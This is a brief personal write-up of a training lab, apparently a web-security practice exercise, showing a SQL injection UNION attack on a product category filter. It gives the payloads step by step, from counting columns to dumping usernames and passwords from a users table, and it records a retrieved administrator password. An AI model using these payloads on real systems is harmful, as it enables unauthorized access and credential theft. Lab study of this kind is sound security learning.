



## Endgoal = perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 




## Burp
GET /filter?category=Accessories HTTP/2


## finding the number of column

`accessories ' union select null , null , null ... -- `


-> we found number of column = 2

## finding the data type of column

`accessories ' union select 'a' , null -- `
`accessories ' union select null , 'a' -- `


we found both column are of string data type


## retriving usename and password from users table

`accessories ' union select username , password from users -- `


## administrator password retrived
nzsri2qi0ah26ugnqmws



![[../../images/Pasted image 20231103000715.png]]